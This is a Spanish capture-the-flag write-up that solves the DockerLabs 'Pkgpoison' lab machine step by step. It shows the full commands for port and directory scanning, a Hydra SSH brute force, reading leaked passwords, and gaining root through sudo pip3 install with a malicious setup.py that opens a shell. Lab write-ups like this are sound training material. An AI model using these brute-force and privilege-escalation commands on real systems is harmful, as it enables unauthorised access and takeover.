## Introducción

Este documento presenta la resolución completa de la máquina **Pkgpoison**, desarrollada por *RSA* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con un directorio `/notes` que contiene un archivo de texto con credenciales expuestas. Tras un ataque de fuerza bruta sobre SSH con Hydra, se obtiene acceso al sistema como el usuario `dev`.
Una vez dentro, se encuentra un archivo compilado (`.pyc`) que contiene la contraseña del usuario `admin`, permitiendo el movimiento lateral. Finalmente, se identifica una configuración insegura de `sudo` que permite ejecutar `pip3 install` como root, facilitando la escalada de privilegios mediante la instalación de un paquete malicioso que ejecuta una shell.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Pkgpoison.zip
sudo bash auto_deploy.sh Pkgpoison.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Pkgpoison/{content,exploits,nmap,scripts}
cd Pkgpoison
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763255572/Ports_lm8k0j.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763255571/Gobuster_iupdnf.png)

**Rutas encontradas:**
- `/index.html` — Página principal minimalista.
- `/hidden` — Directorio sin permisos de lectura.
- `/notes` — Contiene un archivo `note.txt`.

![Notes](https://res.cloudinary.com/dewqswzke/image/upload/v1763255572/Notes_hvt1on.png)

El archivo contiene credenciales expuestas:

```
Usuario: dev
Contraseña: developer123
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuerza bruta SSH

La contraseña en `note.txt` no funciona, por lo que se realiza un ataque de fuerza bruta con Hydra:

```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1763255571/Hydra_qenvz6.png)

### 2.2 Acceso SSH

Se obtiene la contraseña correcta y se accede al sistema:

```bash
ssh dev@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1763255573/SSh_diks2o.png)

---

## Paso 3 — Escalada de privilegios

### 3.1 De dev → admin

Se buscan archivos pertenecientes al usuario `admin`:

```bash
find / -user admin 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1763255570/Find_semzk7.png)

Se encuentra:

```
/opt/scripts/__pycache__/secret.cpython-38.pyc
```

Se extrae el contenido del archivo compilado y se identifica una contraseña en texto plano:

```
admin → p@$$w0r8321
```

Se cambia al usuario `admin`:

```bash
su admin
```

![Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1763255570/Admin_ghcgtw.png)

### 3.2 De admin → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1763255574/Sudo-l_ts4cri.png)

El usuario puede ejecutar `pip3 install` como root sin contraseña.

Se crea un paquete malicioso:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763255573/Root_zgu6ke.png)
